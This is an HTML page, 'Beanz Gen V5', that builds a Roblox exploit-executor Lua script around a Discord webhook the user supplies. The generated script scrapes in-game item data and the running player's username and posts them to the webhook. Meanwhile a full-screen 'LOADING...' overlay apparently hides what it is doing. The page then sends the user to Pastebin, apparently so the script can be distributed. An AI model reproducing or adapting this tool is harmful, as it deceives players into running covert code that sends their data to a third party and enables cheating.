<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Beanz Gen V5</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #111; border: 2px solid #0f0; padding: 20px; border-radius: 10px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 0 20px #0f0; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #0f0; color: #0f0; box-sizing: border-box; border-radius: 5px; }
        button { width: 100%; padding: 12px; background: #0f0; border: none; color: #000; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 5px; }
        .step { background: #050505; border: 1px dashed #0f0; padding: 10px; margin-top: 15px; display: none; text-align: left; font-size: 12px; }
        textarea { width: 100%; height: 80px; background: #000; color: #0f0; border: 1px solid #333; margin-top: 5px; font-size: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>BEANZ GEN V5</h2>
        <input type="text" id="webhook" placeholder="Paste Discord Webhook URL">
        <button onclick="generate()">GENERATE SCRIPT</button>

        <div id="step1" class="step">
            <strong>STEP 1:</strong> Copy the code below.<br>
            <textarea id="output" readonly></textarea>
            <button style="margin-top:5px; padding:5px; font-size:10px;" onclick="copyCode()">CLICK TO COPY CODE</button>
        </div>

        <div id="step2" class="step">
            <strong>STEP 2:</strong> Click the button below to open Pastebin, paste your code, and click "Create New Paste".<br>
            <button onclick="window.open('https://pastebin.com', '_blank')">OPEN PASTEBIN</button>
        </div>
    </div>

    <script>
        function generate() {
            const web = document.getElementById('webhook').value.trim();
            if(!web.includes("discord.com")) return alert("Invalid Webhook");

            const script = `local WEBHOOK_URL = "${web}"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local function send()
    local d = {}
    local deb = Workspace:FindFirstChild("Debris")
    if deb then
        for _, t in ipairs(deb:GetChildren()) do
            if t.Name == "FastOverheadTemplate" then
                local ov = t:FindFirstChild("AnimalOverhead")
                if ov then
                    local n = ov:FindFirstChild("DisplayName")
                    local g = ov:FindFirstChild("Generation")
                    if n and g then table.insert(d, n.Text .. " (Gen: " .. g.Text .. ")") end
                end
            end
        end
    end
    local s = table.concat(d, "\\n")
    local p = {["content"] = "@everyone", ["embeds"] = {{["title"] = "🫘 Scrape Result", ["color"] = 65280, ["fields"] = {{["name"] = "Player", ["value"] = Players.LocalPlayer.Name}, {["name"] = "Data", ["value"] = "\\\`\\\`\\\`" .. (s ~= "" and s or "None Found") .. "\\\`\\\`\\\`"}}}} }
    local r = syn and syn.request or http and http.request or http_request or request
    if r then r({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(p)}) end
end

local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
local f = Instance.new("Frame", sg)
f.Size = UDim2.new(1, 0, 1, 0)
f.BackgroundColor3 = Color3.new(0,0,0)
local l = Instance.new("TextLabel", f)
l.Size = UDim2.new(1,0,1,0)
l.Text = "LOADING..."
l.TextColor3 = Color3.new(1,1,1)
l.TextSize = 30

task.wait(2)
send()`;

            document.getElementById('output').value = script;
            document.getElementById('step1').style.display = "block";
            document.getElementById('step2').style.display = "block";
        }

        function copyCode() {
            const copyText = document.getElementById("output");
            copyText.select();
            copyText.setSelectionRange(0, 99999); 
            navigator.clipboard.writeText(copyText.value);
            alert("Code Copied!");
        }
    </script>
</body>
</html>
